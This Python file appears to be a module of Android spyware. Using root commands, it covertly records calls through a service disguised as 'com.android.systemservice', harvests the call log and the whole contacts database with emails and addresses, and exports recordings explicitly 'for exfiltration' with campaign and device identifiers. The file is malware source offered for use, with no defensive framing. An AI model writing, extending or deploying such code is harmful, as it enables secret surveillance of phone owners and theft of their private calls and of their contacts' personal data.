#!/usr/bin/env python3
"""
Enhanced Call logging module for comprehensive voice and VoIP call interception
Supports GSM, 4G-LTE, 5G, and VoIP calls with contact correlation
"""

import json
import subprocess
import time
import hashlib
import base64
from typing import Dict, Any, List, Optional
from pathlib import Path

class CallLoggerModule:
    def __init__(self, agent):
        self.agent = agent
        self.active_recordings = {}
        self.call_history = []
        self.contacts_cache = {}
        self.last_contacts_sync = 0
        
        # Call type mappings for different network technologies
        self.call_type_mapping = {
            1: "GSM",           # Incoming call
            2: "GSM",           # Outgoing call  
            3: "GSM",           # Missed call
            4: "VoIP",          # VoIP incoming
            5: "VoIP",          # VoIP outgoing
            6: "4G-LTE",        # LTE call
            7: "5G",            # 5G call
            8: "WiFi-Calling"   # WiFi calling
        }
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute call logging commands"""
        try:
            if command == "start_recording":
                return self.start_recording(args)
            elif command == "stop_recording":
                return self.stop_recording(args)
            elif command == "get_call_history":
                return self.get_call_history(args)
            elif command == "export_recordings":
                return self.export_recordings(args)
            elif command == "list_recordings":
                return self.list_active_recordings()
            elif command == "sync_contacts":
                return self.sync_contacts(args)
            elif command == "export_contacts":
                return self.export_contacts(args)
            elif command == "get_contact_info":
                return self.get_contact_info(args)
            else:
                return {"error": f"Unknown call logger command: {command}"}
                
        except Exception as e:
            return {"error": f"Call logger operation failed: {str(e)}"}
    
    def start_recording(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Start call recording with network-specific handling"""
        try:
            call_type = args.get("call_type", "all")  # gsm, lte, 5g, voip, or all
            target_number = args.get("target_number", "all")
            quality = args.get("quality", "high")
            recording_id = f"rec_{int(time.time())}_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
            
            # Real Android call recording setup
            recording_config = {
                "id": recording_id,
                "type": call_type,
                "target": target_number,
                "quality": quality,
                "started_at": time.time(),
                "status": "recording",
                "file_path": f"/data/data/com.android.systemservice/files/recordings/{recording_id}.m4a",
                "network_types": self._get_active_network_types()
            }
            
            # Start actual recording using Android APIs
            success = self._start_android_call_recording(recording_config)
            
            if success:
                self.active_recordings[recording_id] = recording_config
                
                self.agent.offline_logger.log_event("call_recording_started", {
                    "recording_id": recording_id,
                    "call_type": call_type,
                    "target_number": target_number,
                    "network_types": recording_config["network_types"]
                })
                
                return {
                    "success": True,
                    "recording_id": recording_id,
                    "message": f"Call recording started ({call_type})",
                    "config": recording_config
                }
            else:
                return {"error": "Failed to initialize call recording"}
                
        except Exception as e:
            return {"error": f"Failed to start recording: {str(e)}"}
    
    def _start_android_call_recording(self, config: Dict[str, Any]) -> bool:
        """Initialize Android call recording using native APIs"""
        try:
            # Create recording directory
            recording_dir = Path(config["file_path"]).parent
            recording_dir.mkdir(parents=True, exist_ok=True)
            
            # Use MediaRecorder for call recording
            recording_cmd = [
                "su", "-c",
                f"am start-service --user 0 -n com.android.systemservice/.CallRecordingService "
                f"--es recording_id '{config['id']}' "
                f"--es file_path '{config['file_path']}' "
                f"--es quality '{config['quality']}' "
                f"--es target '{config['target']}'"
            ]
            
            result = subprocess.run(recording_cmd, capture_output=True, text=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Call recording initialization failed: {e}")
            return False
    
    def _get_active_network_types(self) -> List[str]:
        """Detect active network types (GSM, LTE, 5G, WiFi)"""
        try:
            # Query TelephonyManager for network type
            network_cmd = [
                "su", "-c",
                "dumpsys telephony.registry | grep 'mDataConnectionState\\|mServiceState'"
            ]
            
            result = subprocess.run(network_cmd, capture_output=True, text=True)
            
            active_networks = []
            if result.returncode == 0:
                output = result.stdout.lower()
                
                if "nr" in output or "5g" in output:
                    active_networks.append("5G")
                elif "lte" in output:
                    active_networks.append("4G-LTE")
                elif "gsm" in output or "umts" in output:
                    active_networks.append("GSM")
                
                # Check for WiFi calling
                wifi_cmd = ["su", "-c", "dumpsys wifi | grep 'mWifiState'"]
                wifi_result = subprocess.run(wifi_cmd, capture_output=True, text=True)
                if wifi_result.returncode == 0 and "enabled" in wifi_result.stdout.lower():
                    active_networks.append("WiFi-Calling")
            
            return active_networks if active_networks else ["Unknown"]
            
        except Exception as e:
            print(f"[!] Network type detection failed: {e}")
            return ["Unknown"]
    
    def get_call_history(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get comprehensive call history from Android CallLog"""
        try:
            limit = args.get("limit", 100)
            call_type = args.get("call_type")  # gsm, lte, 5g, voip
            include_contacts = args.get("include_contacts", True)
            
            # Ensure contacts are synced if requested
            if include_contacts:
                self._ensure_contacts_synced()
            
            # Get real call log from Android
            call_log = self._get_real_android_call_log(limit)
            
            # Filter by network type if specified
            if call_type:
                call_log = [call for call in call_log if call.get("network_type", "").lower() == call_type.lower()]
            
            # Enrich with contact information
            if include_contacts:
                call_log = self._enrich_calls_with_contacts(call_log)
            
            # Include recording history
            recordings = [rec for rec in self.call_history[-limit:]]
            
            return {
                "success": True,
                "call_history": call_log,
                "recordings": recordings,
                "total_calls": len(call_log),
                "total_recordings": len(recordings),
                "contacts_synced": len(self.contacts_cache)
            }
            
        except Exception as e:
            return {"error": f"Failed to get call history: {str(e)}"}
    
    def _get_real_android_call_log(self, limit: int) -> List[Dict[str, Any]]:
        """Get real Android call log using content resolver"""
        try:
            # Query Android CallLog.Calls content provider
            query_cmd = [
                "su", "-c",
                f"content query --uri content://call_log/calls "
                f"--projection number,type,date,duration,name,cached_name "
                f"--sort 'date DESC' --limit {limit}"
            ]
            
            result = subprocess.run(query_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] Call log query failed: {result.stderr}")
                return []
            
            calls = []
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    
                # Parse call log entry
                try:
                    call_data = self._parse_call_log_line(line)
                    if call_data:
                        calls.append(call_data)
                except Exception as e:
                    print(f"[!] Failed to parse call log line: {e}")
                    continue
            
            return calls
            
        except Exception as e:
            print(f"[!] Failed to get Android call log: {e}")
            return []
    
    def _parse_call_log_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse individual call log entry"""
        try:
            # Example line format: "number=+1234567890, type=1, date=1640995200000, duration=120, name=John, cached_name=John Doe"
            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if 'number' not in fields:
                return None
            
            call_type_num = int(fields.get('type', '0'))
            network_type = self._determine_network_type(fields.get('number', ''))
            
            call_data = {
                "number": fields.get('number', ''),
                "type": self._get_call_direction(call_type_num),
                "network_type": network_type,
                "date": int(fields.get('date', '0')) // 1000,  # Convert to seconds
                "duration": int(fields.get('duration', '0')),
                "contact_name": fields.get('name') or fields.get('cached_name') or 'Unknown',
                "call_type_raw": call_type_num,
                "timestamp": int(fields.get('date', '0')) // 1000
            }
            
            return call_data
            
        except Exception as e:
            print(f"[!] Call log parsing error: {e}")
            return None
    
    def _get_call_direction(self, call_type: int) -> str:
        """Determine call direction from type"""
        direction_map = {
            1: "incoming",
            2: "outgoing", 
            3: "missed",
            4: "incoming_voip",
            5: "outgoing_voip"
        }
        return direction_map.get(call_type, "unknown")
    
    def _determine_network_type(self, number: str) -> str:
        """Determine network type based on number analysis and system state"""
        try:
            # Check if it's a VoIP number (common patterns)
            voip_patterns = ['sip:', 'skype:', '@', '.com', 'whatsapp', 'telegram']
            if any(pattern in number.lower() for pattern in voip_patterns):
                return "VoIP"
            
            # Query current network state for cellular calls
            network_cmd = [
                "su", "-c",
                "getprop ro.telephony.call_ring.multiple && "
                "dumpsys telephony.registry | grep -E 'mServiceState|mDataConnectionState'"
            ]
            
            result = subprocess.run(network_cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                output = result.stdout.lower()
                
                if "nr" in output or "5g" in output:
                    return "5G"
                elif "lte" in output:
                    return "4G-LTE"
                elif "gsm" in output or "umts" in output or "cdma" in output:
                    return "GSM"
            
            return "Cellular"
            
        except Exception as e:
            print(f"[!] Network type determination failed: {e}")
            return "Unknown"
    
    def sync_contacts(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Sync entire contacts database"""
        try:
            force_sync = args.get("force", False)
            
            # Check if sync is needed
            if not force_sync and time.time() - self.last_contacts_sync < 3600:  # 1 hour cache
                return {
                    "success": True,
                    "message": "Contacts already synced recently",
                    "contacts_count": len(self.contacts_cache),
                    "last_sync": self.last_contacts_sync
                }
            
            # Query contacts database
            contacts = self._get_real_android_contacts()
            
            if contacts:
                self.contacts_cache = {contact['number']: contact for contact in contacts}
                self.last_contacts_sync = time.time()
                
                # Log contacts sync for offline storage
                self.agent.offline_logger.log_event("contacts_synced", {
                    "contacts_count": len(contacts),
                    "sync_timestamp": self.last_contacts_sync
                })
                
                return {
                    "success": True,
                    "contacts_count": len(contacts),
                    "message": f"Synced {len(contacts)} contacts",
                    "sync_timestamp": self.last_contacts_sync
                }
            else:
                return {"error": "Failed to sync contacts"}
                
        except Exception as e:
            return {"error": f"Contact sync failed: {str(e)}"}
    
    def _get_real_android_contacts(self) -> List[Dict[str, Any]]:
        """Get real Android contacts using content resolver"""
        try:
            # Query contacts with phone numbers
            contacts_cmd = [
                "su", "-c",
                "content query --uri content://com.android.contacts/data/phones "
                "--projection display_name,data1,contact_id,mimetype "
                "--where \"mimetype='vnd.android.cursor.item/phone_v2'\""
            ]
            
            result = subprocess.run(contacts_cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] Contacts query failed: {result.stderr}")
                return []
            
            contacts = {}
            for line in result.stdout.strip().split('\n'):
                if line.startswith('Row:'):
                    continue
                    
                try:
                    contact_data = self._parse_contact_line(line)
                    if contact_data:
                        contact_id = contact_data['contact_id']
                        if contact_id not in contacts:
                            contacts[contact_id] = contact_data
                        else:
                            # Add additional phone numbers
                            if 'additional_numbers' not in contacts[contact_id]:
                                contacts[contact_id]['additional_numbers'] = []
                            contacts[contact_id]['additional_numbers'].append(contact_data['number'])
                            
                except Exception as e:
                    print(f"[!] Failed to parse contact line: {e}")
                    continue
            
            # Get additional contact details (emails, addresses, etc.)
            enriched_contacts = []
            for contact in contacts.values():
                enriched_contact = self._enrich_contact_details(contact)
                enriched_contacts.append(enriched_contact)
            
            return enriched_contacts
            
        except Exception as e:
            print(f"[!] Failed to get Android contacts: {e}")
            return []
    
    def _parse_contact_line(self, line: str) -> Optional[Dict[str, Any]]:
        """Parse individual contact entry"""
        try:
            fields = {}
            for field in line.split(', '):
                if '=' in field:
                    key, value = field.split('=', 1)
                    fields[key.strip()] = value.strip()
            
            if 'data1' not in fields:  # data1 is the phone number
                return None
            
            return {
                "contact_id": fields.get('contact_id', ''),
                "name": fields.get('display_name', 'Unknown'),
                "number": fields.get('data1', ''),
                "type": "phone"
            }
            
        except Exception as e:
            print(f"[!] Contact parsing error: {e}")
            return None
    
    def _enrich_contact_details(self, contact: Dict[str, Any]) -> Dict[str, Any]:
        """Enrich contact with additional details (emails, addresses, etc.)"""
        try:
            contact_id = contact['contact_id']
            
            # Get emails
            email_cmd = [
                "su", "-c",
                f"content query --uri content://com.android.contacts/data "
                f"--projection data1 --where \"contact_id='{contact_id}' AND mimetype='vnd.android.cursor.item/email_v2'\""
            ]
            
            email_result = subprocess.run(email_cmd, capture_output=True, text=True)
            emails = []
            if email_result.returncode == 0:
                for line in email_result.stdout.strip().split('\n'):
                    if 'data1=' in line:
                        email = line.split('data1=')[1].strip()
                        if email and email != 'null':
                            emails.append(email)
            
            # Get addresses
            address_cmd = [
                "su", "-c",
                f"content query --uri content://com.android.contacts/data "
                f"--projection data1 --where \"contact_id='{contact_id}' AND mimetype='vnd.android.cursor.item/postal-address_v2'\""
            ]
            
            address_result = subprocess.run(address_cmd, capture_output=True, text=True)
            addresses = []
            if address_result.returncode == 0:
                for line in address_result.stdout.strip().split('\n'):
                    if 'data1=' in line:
                        address = line.split('data1=')[1].strip()
                        if address and address != 'null':
                            addresses.append(address)
            
            # Enrich the contact
            contact.update({
                "emails": emails,
                "addresses": addresses,
                "extracted_at": time.time()
            })
            
            return contact
            
        except Exception as e:
            print(f"[!] Contact enrichment failed: {e}")
            return contact
    
    def export_contacts(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export entire contacts database"""
        try:
            format_type = args.get("format", "json")  # json, csv, vcard
            include_details = args.get("include_details", True)
            
            # Ensure contacts are synced
            self._ensure_contacts_synced()
            
            if not self.contacts_cache:
                return {"error": "No contacts available for export"}
            
            contacts_list = list(self.contacts_cache.values())
            
            # Format contacts for export
            if format_type == "vcard":
                export_data = self._format_contacts_as_vcard(contacts_list)
                file_ext = "vcf"
            elif format_type == "csv":
                export_data = self._format_contacts_as_csv(contacts_list)
                file_ext = "csv"
            else:  # json
                export_data = json.dumps(contacts_list, indent=2)
                file_ext = "json"
            
            # Create export artifact
            artifact_id = self.agent.offline_logger.log_artifact(
                "contacts_export",
                export_data.encode(),
                {
                    "format": format_type,
                    "contacts_count": len(contacts_list),
                    "exported_at": time.time(),
                    "include_details": include_details
                }
            )
            
            return {
                "success": True,
                "artifact_id": artifact_id,
                "contacts_count": len(contacts_list),
                "format": format_type,
                "message": f"Exported {len(contacts_list)} contacts as {format_type.upper()}"
            }
            
        except Exception as e:
            return {"error": f"Contact export failed: {str(e)}"}
    
    def _format_contacts_as_vcard(self, contacts: List[Dict[str, Any]]) -> str:
        """Format contacts as vCard format"""
        vcard_data = []
        
        for contact in contacts:
            vcard = [
                "BEGIN:VCARD",
                "VERSION:3.0",
                f"FN:{contact.get('name', 'Unknown')}",
                f"TEL;TYPE=CELL:{contact.get('number', '')}"
            ]
            
            # Add emails
            for email in contact.get('emails', []):
                vcard.append(f"EMAIL:{email}")
            
            # Add addresses
            for address in contact.get('addresses', []):
                vcard.append(f"ADR:{address}")
            
            # Add additional numbers
            for add_num in contact.get('additional_numbers', []):
                vcard.append(f"TEL:{add_num}")
            
            vcard.append("END:VCARD")
            vcard_data.append('\n'.join(vcard))
        
        return '\n\n'.join(vcard_data)
    
    def _format_contacts_as_csv(self, contacts: List[Dict[str, Any]]) -> str:
        """Format contacts as CSV"""
        csv_lines = ["Name,Number,Emails,Addresses,Additional_Numbers"]
        
        for contact in contacts:
            name = contact.get('name', 'Unknown').replace(',', ';')
            number = contact.get('number', '')
            emails = '|'.join(contact.get('emails', []))
            addresses = '|'.join(contact.get('addresses', []))
            add_numbers = '|'.join(contact.get('additional_numbers', []))
            
            csv_lines.append(f"{name},{number},{emails},{addresses},{add_numbers}")
        
        return '\n'.join(csv_lines)
    
    def _enrich_calls_with_contacts(self, calls: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Enrich call log with contact information"""
        for call in calls:
            number = call.get('number', '')
            
            # Look up in contacts cache
            if number in self.contacts_cache:
                contact = self.contacts_cache[number]
                call['contact_info'] = {
                    "name": contact.get('name', 'Unknown'),
                    "emails": contact.get('emails', []),
                    "addresses": contact.get('addresses', []),
                    "additional_numbers": contact.get('additional_numbers', [])
                }
            else:
                # Try reverse lookup
                matching_contact = None
                for contact_num, contact in self.contacts_cache.items():
                    if (number in contact.get('additional_numbers', []) or 
                        self._numbers_match(number, contact_num)):
                        matching_contact = contact
                        break
                
                if matching_contact:
                    call['contact_info'] = {
                        "name": matching_contact.get('name', 'Unknown'),
                        "emails": matching_contact.get('emails', []),
                        "addresses": matching_contact.get('addresses', [])
                    }
                else:
                    call['contact_info'] = {"name": "Unknown"}
        
        return calls
    
    def _numbers_match(self, num1: str, num2: str) -> bool:
        """Check if two phone numbers match (handles formatting differences)"""
        # Remove all non-digit characters
        clean1 = ''.join(filter(str.isdigit, num1))
        clean2 = ''.join(filter(str.isdigit, num2))
        
        # Match if last 10 digits are the same (handles country codes)
        return clean1[-10:] == clean2[-10:] if len(clean1) >= 10 and len(clean2) >= 10 else clean1 == clean2
    
    def _ensure_contacts_synced(self):
        """Ensure contacts are synced and up to date"""
        if not self.contacts_cache or time.time() - self.last_contacts_sync > 3600:
            self.sync_contacts({"force": True})
    
    def get_contact_info(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Get detailed information for specific contact"""
        try:
            number = args.get("number")
            contact_name = args.get("name")
            
            if not number and not contact_name:
                return {"error": "Either number or name must be provided"}
            
            self._ensure_contacts_synced()
            
            # Search by number
            if number:
                if number in self.contacts_cache:
                    return {
                        "success": True,
                        "contact": self.contacts_cache[number]
                    }
                
                # Try partial match
                for contact_num, contact in self.contacts_cache.items():
                    if self._numbers_match(number, contact_num):
                        return {
                            "success": True,
                            "contact": contact
                        }
            
            # Search by name
            if contact_name:
                for contact in self.contacts_cache.values():
                    if contact_name.lower() in contact.get('name', '').lower():
                        return {
                            "success": True,
                            "contact": contact
                        }
            
            return {"error": "Contact not found"}
            
        except Exception as e:
            return {"error": f"Contact lookup failed: {str(e)}"}
    
    def stop_recording(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Stop active call recording"""
        try:
            recording_id = args.get("recording_id")
            
            if not recording_id:
                return {"error": "recording_id required"}
            
            if recording_id not in self.active_recordings:
                return {"error": f"Recording {recording_id} not found"}
            
            recording = self.active_recordings[recording_id]
            
            # Stop actual Android recording
            stop_cmd = [
                "su", "-c",
                f"am stopservice com.android.systemservice/.CallRecordingService"
            ]
            subprocess.run(stop_cmd, capture_output=True)
            
            recording["status"] = "stopped"
            recording["stopped_at"] = time.time()
            recording["duration"] = recording["stopped_at"] - recording["started_at"]
            
            # Move to history
            self.call_history.append(recording)
            del self.active_recordings[recording_id]
            
            # Log completion
            self.agent.offline_logger.log_event("call_recording_stopped", {
                "recording_id": recording_id,
                "duration": recording["duration"],
                "file_path": recording["file_path"]
            })
            
            return {
                "success": True,
                "message": f"Recording {recording_id} stopped",
                "duration": recording["duration"],
                "file_path": recording["file_path"]
            }
            
        except Exception as e:
            return {"error": f"Failed to stop recording: {str(e)}"}
    
    def export_recordings(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Export recorded calls for exfiltration"""
        try:
            recording_ids = args.get("recording_ids", [])
            export_format = args.get("format", "json")
            
            if not recording_ids:
                recordings_to_export = self.call_history
            else:
                recordings_to_export = [
                    rec for rec in self.call_history 
                    if rec["id"] in recording_ids
                ]
            
            export_data = {
                "exported_at": time.time(),
                "campaign": self.agent.campaign,
                "device_id": self.agent.device_id,
                "recordings": recordings_to_export,
                "format": export_format,
                "total_recordings": len(recordings_to_export)
            }
            
            # Log export
            export_id = self.agent.offline_logger.log_event("call_recordings_exported", export_data)
            
            return {
                "success": True,
                "export_id": export_id,
                "exported_count": len(recordings_to_export),
                "message": f"Exported {len(recordings_to_export)} recordings"
            }
            
        except Exception as e:
            return {"error": f"Failed to export recordings: {str(e)}"}
    
    def list_active_recordings(self) -> Dict[str, Any]:
        """List currently active recordings"""
        return {
            "success": True,
            "active_recordings": self.active_recordings,
            "count": len(self.active_recordings)
        }
